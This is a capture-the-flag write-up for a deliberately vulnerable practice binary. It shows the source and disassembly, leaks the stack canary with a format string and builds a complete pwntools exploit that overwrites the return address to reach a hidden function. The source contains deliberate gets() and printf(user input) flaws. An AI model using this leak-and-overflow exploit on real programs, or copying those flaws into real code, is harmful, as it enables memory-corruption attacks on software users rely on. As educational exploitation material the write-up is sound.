Let's take a look at the source code...

```
#include <stdlib.h>
#include <stdio.h>

void discovery()
{
	puts("My best engineers assured me that this code was impenetrable. You have shed some light into this matter. Level Cleared!");
}

void revelation()
{
	char light[489];
	fgets(light, sizeof(light) - 1, stdin);
	printf(light);
}


int main()
{
	revelation();
	char buf0[10];
	gets(buf0);
}
```

Now let's look at what binary mitigations are in place using pwntools.

```
$	pwn checksec d0_64 
[*] '/Hackery/escape/def_ovr/d0_64/d0_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we can see that there is a stack canary, and non-executable stack (NX). A stack canary is a binary mitigation technique designed to catch buffer overflows. What it does is it puts a piece of data inbetween where a buffer overflow could possibly start and the return address (for x64 programs it's stored in the rbp register). It creates this at the start of the function and then checks it at the end, and it it's changed then it knows a buffer overflow has happened and will immediately terminate the program. What a non-executable stack will do, is it will make all space that a user can write to unable to be executed. This will stop an attacker from simply pushing shellcode onto the stack, then overflowing the return address to jump to the shellcode. Fortunately both of these are just mitigations that are designed to make it harder to carry out a buffer overflow attack, but it is still possible.

When we look at the code itself we see two seperate vulnerabillities. The first that will be executed is a format string exploit with a printf function in the revelation function. The second is a buffer overflow exploit with a gets function in the main function. We see that our objective is to run the discovery function, which is never called in the code. We can do this by simply using a buffer overflow function to write over the return address with the address of the revelation function, thus redirecting code execution flow to that function. The non-executable stack will not impede the exploit at all, since we are not trying to run shellcode. However the Stack Canary will impede us, since we have to write over it to reach the return address. However if we write over the stack canary with the stack canary, then when it checks to see if the stack canary has been changed it will see that it is the same as it started and our exploit should work. In order to do this, we will need to leake the canary which is randomly generated for every instance of the program. 

We might be able to use the format string exploit in the revelation function to read the stack canary. Thing is the canary for the revelation function, and the main function should be the same canary (even though the canary is randomly generated for every instance of the program). So if we used the format string exploit in revelation to read the canary, then used it to overwrite the canary in main, it should work. To figure out how to read the canary, we will need to look at the assembly for the revelation function.

```
Dump of assembler code for function revelation:
   0x00000000004006b7 <+0>:	push   rbp
   0x00000000004006b8 <+1>:	mov    rbp,rsp
   0x00000000004006bb <+4>:	sub    rsp,0x200
   0x00000000004006c2 <+11>:	mov    rax,QWORD PTR fs:0x28
   0x00000000004006cb <+20>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004006cf <+24>:	xor    eax,eax
   0x00000000004006d1 <+26>:	mov    rdx,QWORD PTR [rip+0x200988]        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x00000000004006d8 <+33>:	lea    rax,[rbp-0x200]
   0x00000000004006df <+40>:	mov    esi,0x1e8
   0x00000000004006e4 <+45>:	mov    rdi,rax
   0x00000000004006e7 <+48>:	call   0x400580 <fgets@plt>
   0x00000000004006ec <+53>:	lea    rax,[rbp-0x200]
   0x00000000004006f3 <+60>:	mov    rdi,rax
   0x00000000004006f6 <+63>:	mov    eax,0x0
   0x00000000004006fb <+68>:	call   0x400560 <printf@plt>
   0x0000000000400700 <+73>:	nop
   0x0000000000400701 <+74>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400705 <+78>:	xor    rax,QWORD PTR fs:0x28
   0x000000000040070e <+87>:	je     0x400715 <revelation+94>
   0x0000000000400710 <+89>:	call   0x400550 <__stack_chk_fail@plt>
   0x0000000000400715 <+94>:	leave  
   0x0000000000400716 <+95>:	ret    
End of assembler dump.
```

So we can see at the end, it calls the stack check function so we know it has a stack canary. At the beginning of the assembly code, we can see where the stack canary will be stored.

```
   0x00000000004006bb <+4>:	sub    rsp,0x200
   0x00000000004006c2 <+11>:	mov    rax,QWORD PTR fs:0x28
   0x00000000004006cb <+20>:	mov    QWORD PTR [rbp-0x8],rax
```

So the stack canary is stored 0x200 (512) bytes down the stack. However before we start reading through the stack we have to read through the 6 registers that it would expect input from in this order %rdi, %rsi, %rdx, %rcx, %r8, and %r9. That will take 40 bytes to get through the registers, and then start reading through the stack (the reason why it isn't 48 bytes is probably because we have to skip past the rdi register which stores the format string, and is also the first argument). So in total we have to read 0x200 + 40 = 552 bytes in order to get the stack canary. However we can read the bytes as long longs, which will display 8 bytes of data at a time. So we should only have to read 552 / = 69 long longs in order to get the stack canary. Let's try it.

```
$	python -c 'print "%llx."*69' | ./d0_64 
60216a.7ffff7dd3790.6c6c252e786c6c25.60216a.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.a2e.0.0.2f2f2f2f2f2f2f2f.2f2f2f2f2f2f2f2f.0.0.0.0.0.0.ff00000000000000.0.0.0.5f5f00656d697474.7465675f6f736476.0.0.1.5b25a075507a3600.
```

So we can see here, the stack canary for this instance was 0x5b25a075507a3600. If you run it multiple times, you see that it changes for each instance which is expected. In addition to that we can see that the least significant bit is a null byte (\x00) which is a characteristic of stack canaries. Now that we have the stack canary, let's figure out how far it is from the start of the buffer overflow so we can write over it. For that we will use gdb. 

```
gdb-peda$ disas revelation
Dump of assembler code for function revelation:
   0x00000000004006b7 <+0>:	push   rbp
   0x00000000004006b8 <+1>:	mov    rbp,rsp
   0x00000000004006bb <+4>:	sub    rsp,0x200
   0x00000000004006c2 <+11>:	mov    rax,QWORD PTR fs:0x28
   0x00000000004006cb <+20>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004006cf <+24>:	xor    eax,eax
   0x00000000004006d1 <+26>:	mov    rdx,QWORD PTR [rip+0x200988]        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x00000000004006d8 <+33>:	lea    rax,[rbp-0x200]
   0x00000000004006df <+40>:	mov    esi,0x1e8
   0x00000000004006e4 <+45>:	mov    rdi,rax
   0x00000000004006e7 <+48>:	call   0x400580 <fgets@plt>
   0x00000000004006ec <+53>:	lea    rax,[rbp-0x200]
   0x00000000004006f3 <+60>:	mov    rdi,rax
   0x00000000004006f6 <+63>:	mov    eax,0x0
   0x00000000004006fb <+68>:	call   0x400560 <printf@plt>
   0x0000000000400700 <+73>:	nop
   0x0000000000400701 <+74>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400705 <+78>:	xor    rax,QWORD PTR fs:0x28
   0x000000000040070e <+87>:	je     0x400715 <revelation+94>
   0x0000000000400710 <+89>:	call   0x400550 <__stack_chk_fail@plt>
   0x0000000000400715 <+94>:	leave  
   0x0000000000400716 <+95>:	ret    
End of assembler dump.
gdb-peda$ b *revelation+73
Breakpoint 1 at 0x400700
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400717 <+0>:	push   rbp
   0x0000000000400718 <+1>:	mov    rbp,rsp
   0x000000000040071b <+4>:	sub    rsp,0x20
   0x000000000040071f <+8>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400728 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040072c <+21>:	xor    eax,eax
   0x000000000040072e <+23>:	mov    eax,0x0
   0x0000000000400733 <+28>:	call   0x4006b7 <revelation>
   0x0000000000400738 <+33>:	lea    rax,[rbp-0x20]
   0x000000000040073c <+37>:	mov    rdi,rax
   0x000000000040073f <+40>:	mov    eax,0x0
   0x0000000000400744 <+45>:	call   0x400590 <gets@plt>
   0x0000000000400749 <+50>:	mov    eax,0x0
   0x000000000040074e <+55>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000400752 <+59>:	xor    rdx,QWORD PTR fs:0x28
   0x000000000040075b <+68>:	je     0x400762 <main+75>
   0x000000000040075d <+70>:	call   0x400550 <__stack_chk_fail@plt>
   0x0000000000400762 <+75>:	leave  
   0x0000000000400763 <+76>:	ret    
End of assembler dump.
gdb-peda$ b *main+50
Breakpoint 2 at 0x400749
gdb-peda$ r
Starting program: /Hackery/escape/def_ovr/d0_64/d0_64 
%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.
60216a.7ffff7dd3790.6c6c252e786c6c25.60216a.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.7ffff7000a2e.0.0.0.0.2f2f2f2f2f2f2f2f.2f2f2f2f2f2f2f2f.0.0.0.0.0.0.0.0.0.0.ff00000000000000.ff0000000000.1.4e3d5e634f5fb900.
```

So we can see here that the canary is 0x4e3d5e634f5fb900 (this time we only read enough data to get the canary). Now let's go to the second Breakpoint so we can see the offsets between the start of our buffer overflow, and the stack canary and the return address.

```
Breakpoint 1, 0x0000000000400700 in revelation ()
gdb-peda$ c
Continuing.
escape
```

And then breakpoint 2

```
Breakpoint 2, 0x0000000000400749 in main ()
gdb-peda$ find escape
Searching for 'escape' in: None ranges
Found 5 results, display max 5 items:
 [heap] : 0x602010 ("escape\nlx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx."...)
[stack] : 0x7fffffffde10 --> 0x657061637365 ('escape')
[stack] : 0x7fffffffe286 ("escape/def_ovr/d0_64/d0_64")
[stack] : 0x7fffffffec36 ("escape/def_ovr/d0_64")
[stack] : 0x7fffffffefdd ("escape/def_ovr/d0_64/d0_64")
gdb-peda$ x/x $rbp-0x20
0x7fffffffde10:	0x65
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffde40:
 rip = 0x400749 in main; saved rip = 0x7ffff7a2e830
 called by frame at 0x7fffffffdf00
 Arglist at 0x7fffffffde30, args: 
 Locals at 0x7fffffffde30, Previous frame's sp is 0x7fffffffde40
 Saved registers:
  rbp at 0x7fffffffde30, rip at 0x7fffffffde38
gdb-peda$ find 0x4e3d5e634f5fb900
Searching for '0x4e3d5e634f5fb900' in: None ranges
Found 2 results, display max 2 items:
 mapped : 0x7ffff7fd3728 --> 0x4e3d5e634f5fb900 
[stack] : 0x7fffffffde28 --> 0x4e3d5e634f5fb900 
```

So we can see that our buffer overflow starts at 0x7fffffffde10. We see that the return address in the rip register is at 0x7fffffffde38. We can also see that the stack canary that we need to overwrite is at 0x7fffffffde28 (0x7ffff7fd3728 is at a lower address than the start of our buffer, and since buffer overflows work towards higher addresses we can't write to it). So to calculate the offsets.

```
>>> 0x7fffffffde38 - 0x7fffffffde10
40
>>> 0x7fffffffde28 - 0x7fffffffde10
24
```

So we can see, that we have 40 bytes untill the return address, and 24 bytes to the stack canary. So we will have to write 24 characters, then the stack canary, then 8 more characters (keep in mind the the canary itself takes up 8 characters), and then the address of the discovery function. It would be best to put this all together in a script, which is what I have done. I have modified the format string read to put the canary between two unique strings, that way we can easily parse it.

```
#Import pwntools and regular expressions
from pwn import *
import re

#Designate which elf we are using, and run it
target = process("./d0_64")
elf = ELF("./d0_64")
context(binary=elf)

#Send the format string exploit to leak the canary
target.sendline("%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llxesc%llxape")

#Store the output of the format string memory leak
memleak = target.recvline()

#Parse out the canary from the rest of the memory leak
canary = str(re.findall(r'esc(.*?)ape', memleak))

#Remove excess characters, print and convert the canary to a hex string
canary = canary.replace("['", "")
canary = canary.replace("']", "")
canary = "0x" + canary
print "The Canary Is: " + canary
canary = int(canary, 16)

#Designate the first and second filler segments
filler0 = "0"*24
filler1 = "0"*8

#Pull the symbol for the discovery function address
address = elf.symbols["discovery"]

#Construct the payload by combining the two filler segments, the canary and discovery address (in little endian)
payload = filler0 + p64(canary) + filler1 + p64(address)

#Send the payload (and print it)
print "Sending: " + str(payload)
target.sendline(payload)

#Print the program's output, which should include "Level Cleared!"
print target.recvline()
```

Now let's test it.

```
$ python exploit.py 
[+] Starting local process './d0_64': pid 30936
[*] '/Hackery/escape/def_ovr/d0_64/d0_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
The Canary Is: 0xb59d452d1dbd5500
Sending: 000000000000000000000000\x00U\xbd\x1d-E\x9d\xb500000000\xa6\x06@\x00\x00\x00\x00\x00
My best engineers assured me that this code was impenetrable. You have shed some light into this matter. Level Cleared!

[*] Stopped process './d0_64' (pid 30936)
```

Just like that, we pwned the binary!